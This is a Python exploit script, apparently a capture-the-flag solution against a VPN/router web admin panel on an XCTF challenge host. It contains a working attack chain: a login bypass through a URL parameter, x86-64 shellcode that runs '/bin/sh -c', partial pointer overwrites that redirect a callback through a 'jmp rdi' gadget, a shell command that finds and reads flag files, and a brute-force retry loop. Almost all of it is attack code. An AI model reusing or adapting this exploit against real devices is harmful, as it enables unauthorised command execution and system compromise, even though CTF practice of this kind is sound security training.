#!/usr/bin/env python3
import argparse
import http.cookiejar
import json
import struct
import subprocess
import time
import urllib.error
import urllib.request


SET_SHELLCODE = bytes.fromhex(
    "4889fb31c0b001c1e0084801c331d252"
    "48b82f62696e2f2f7368504889e75266"
    "682d634889e1525351574889e631d26a"
    "3b580f0531ff6a3c580f05"
)

# name/proto/server/user/pass are contiguous in the request buffer and become
# one contiguous shellcode area in the object at obj+0x38.
SET_BLOB = SET_SHELLCODE + (b"\x90" * (0xB0 - len(SET_SHELLCODE)))

# Partial overwrite for custom_ptr:
# - bytes 0..1: callback low bytes b0 02
# - byte 2: NUL terminator, so only low 2 bytes + zeroed 3rd byte are written
# - bytes 4..5: trampoline at obj+0x0c -> jmp short 0x2a -> obj+0x38
CERT_BYTES = bytes([0xB0, 0x02, 0x00, 0x41, 0xEB, 0x2A, 0x42, 0x42])

# default_vpn_apply 0x140d -> jmp rdi gadget 0x1c21 by low-2-byte overwrite
EDIT_BYTES = bytes([0x21, 0x1C])

LOCAL_FIRST_OBJ_OFFSET = 0x2A0


def esc(raw: bytes) -> str:
    return "".join(f"\\x{b:02x}" for b in raw)


def build_custom() -> str:
    cmd = (
        'for x in /readflag /app/readflag /flag /flag.txt /root/flag /home/ctf/flag;'
        'do [ -x "$x" ]&&"$x">./FILE&&exit; [ -r "$x" ]&&cat "$x">./FILE&&exit; done;'
        "find / -maxdepth 3 2>/dev/null|grep -E '/(flag|readflag)[^/]*$'|head -n1|xargs -r cat >./FILE"
    )
    target_len = 0x0AEB
    if len(cmd) >= target_len:
        raise ValueError("custom command is too long")
    return cmd + "#" + ("A" * (target_len - len(cmd) - 1))


def build_set_payload(cert_bytes: bytes = CERT_BYTES) -> dict[str, str]:
    parts = {
        "name": SET_BLOB[:0x20],
        "proto": SET_BLOB[0x20:0x40],
        "server": SET_BLOB[0x40:0x70],
        "user": SET_BLOB[0x70:0x90],
        "pass": SET_BLOB[0x90:0xB0],
    }
    return {
        "action": "set",
        "name": esc(parts["name"]),
        "proto": esc(parts["proto"]),
        "server": esc(parts["server"]),
        "user": esc(parts["user"]),
        "pass": esc(parts["pass"]),
        "cert": esc(cert_bytes),
        "custom": build_custom(),
    }


def build_edit_payload(edit_bytes: bytes = EDIT_BYTES) -> dict[str, str]:
    return {
        "action": "edit",
        "custom": esc(edit_bytes),
    }


def build_apply_payload() -> dict[str, str]:
    return {
        "action": "apply",
        "name": "x",
    }


class Client:
    def __init__(self, base: str):
        self.base = base.rstrip("/")
        self.cookies = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.cookies)
        )

    def get(self, path: str, timeout: float = 5.0) -> bytes:
        with self.opener.open(self.base + path, timeout=timeout) as resp:
            return resp.read()

    def post_json(self, path: str, payload: dict[str, str], timeout: float = 5.0) -> bytes:
        req = urllib.request.Request(
            self.base + path,
            data=json.dumps(payload).encode(),
            headers={"Content-Type": "application/json"},
        )
        with self.opener.open(req, timeout=timeout) as resp:
            return resp.read()

    def login_bypass(self) -> None:
        self.get("/www/http?auth=1&action=login", timeout=5.0)

    def restart(self) -> None:
        # restart.sh often kills its own CGI path before the client gets the full
        # response. A timeout or truncated response is expected here.
        try:
            self.get("/cgi-bin/restart.sh", timeout=1.0)
        except Exception:
            pass

    def try_download(self) -> bytes | None:
        try:
            data = self.get("/cgi-bin/download.cgi", timeout=8.0)
        except Exception:
            return None
        if data.startswith(b'{"status":'):
            return None
        if data.startswith(b"PK\x03\x04"):
            return None
        return data

    def wait_ready(self, retries: int = 8, interval: float = 0.25) -> bool:
        for _ in range(retries):
            try:
                self.get("/control.html", timeout=2.0)
                return True
            except Exception:
                time.sleep(interval)
        return False


def docker_exec(container: str, script: str) -> str:
    out = subprocess.check_output(
        ["docker", "exec", container, "sh", "-lc", script],
        text=True,
    )
    return out.strip()


def read_heap_base(container: str) -> int:
    maps = docker_exec(
        container,
        'pid=$(pidof mainproc); cat /proc/$pid/maps | sed -n "1,12p"',
    )
    for line in maps.splitlines():
        if "[heap]" in line:
            return int(line.split("-", 1)[0], 16)
    raise RuntimeError("heap mapping not found")


def run_local_deterministic(base: str, container: str, delay: float) -> int:
    client = Client(base)
    client.login_bypass()
    client.restart()
    time.sleep(delay)
    if not client.wait_ready(retries=20, interval=0.2):
        print("service not ready after restart", flush=True)
        return 1

    client.login_bypass()
    heap_base = read_heap_base(container)
    obj = heap_base + LOCAL_FIRST_OBJ_OFFSET
    callback = obj + 0x38
    custom_ptr = obj + 0x10

    print(
        f"local heap=0x{heap_base:x} obj=0x{obj:x} "
        f"custom_ptr=0x{custom_ptr:x} callback=0x{callback:x}",
        flush=True,
    )

    set_payload = build_set_payload(struct.pack("<Q", custom_ptr))
    edit_payload = build_edit_payload(struct.pack("<Q", callback))
    apply_payload = build_apply_payload()

    print("set", flush=True)
    client.post_json("/cgi-bin/vpn.cgi", set_payload, timeout=6.0)
    print("edit", flush=True)
    client.post_json("/cgi-bin/vpn.cgi", edit_payload, timeout=6.0)
    print("apply", flush=True)
    client.post_json("/cgi-bin/vpn.cgi", apply_payload, timeout=6.0)

    time.sleep(0.8)
    data = client.try_download()
    if data is None:
        print("download failed", flush=True)
        return 1

    text = data.decode("utf-8", errors="replace").strip()
    print(f"local result: {text}", flush=True)
    return 0


def run(base: str, attempts: int, delay: float) -> int:
    client = Client(base)
    set_payload = build_set_payload()
    edit_payload = build_edit_payload()
    apply_payload = build_apply_payload()
    client.login_bypass()

    for i in range(1, attempts + 1):
        print(f"[{i}] restarting", flush=True)
        client.restart()
        time.sleep(delay)
        if not client.wait_ready():
            try:
                client.login_bypass()
            except Exception as exc:
                print(f"[{i}] relogin failed: {exc}", flush=True)
                time.sleep(delay)
                continue
            if not client.wait_ready():
                print(f"[{i}] service not ready", flush=True)
                time.sleep(delay)
                continue

        try:
            client.post_json("/cgi-bin/vpn.cgi", set_payload, timeout=6.0)
        except urllib.error.HTTPError as exc:
            if exc.code in (401, 403):
                try:
                    client.login_bypass()
                    client.post_json("/cgi-bin/vpn.cgi", set_payload, timeout=6.0)
                except Exception as exc2:
                    print(f"[{i}] set failed after relogin: {exc2}", flush=True)
                    time.sleep(delay)
                    continue
            else:
                print(f"[{i}] set failed: {exc}", flush=True)
                time.sleep(delay)
                continue
        except Exception as exc:
            print(f"[{i}] set failed: {exc}", flush=True)
            time.sleep(delay)
            continue

        try:
            client.post_json("/cgi-bin/vpn.cgi", edit_payload, timeout=4.0)
        except Exception:
            # The common failure mode: custom_ptr did not resolve to callback and
            # Edit_VPN_Custom crashed mainproc. That means the heap byte miss.
            print(f"[{i}] miss", flush=True)
            continue

        print(f"[{i}] edit succeeded, trying apply", flush=True)

        try:
            client.post_json("/cgi-bin/vpn.cgi", apply_payload, timeout=4.0)
        except Exception as exc:
            print(f"[{i}] apply exception: {exc}", flush=True)

        time.sleep(0.6)
        data = client.try_download()
        if data is None:
            print(f"[{i}] no flag yet", flush=True)
            continue

        try:
            text = data.decode("utf-8", errors="replace").strip()
        except Exception:
            text = repr(data[:128])
        print(f"[{i}] flag candidate: {text}", flush=True)
        return 0

    print("flag not found", flush=True)
    return 1


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--url",
        default="http://web-932634b9dd.adworld.xctf.org.cn:80",
    )
    parser.add_argument("--attempts", type=int, default=400)
    parser.add_argument("--delay", type=float, default=0.6)
    parser.add_argument("--local-container")
    args = parser.parse_args()
    if args.local_container:
        return run_local_deterministic(args.url, args.local_container, args.delay)
    return run(args.url, args.attempts, args.delay)


if __name__ == "__main__":
    raise SystemExit(main())
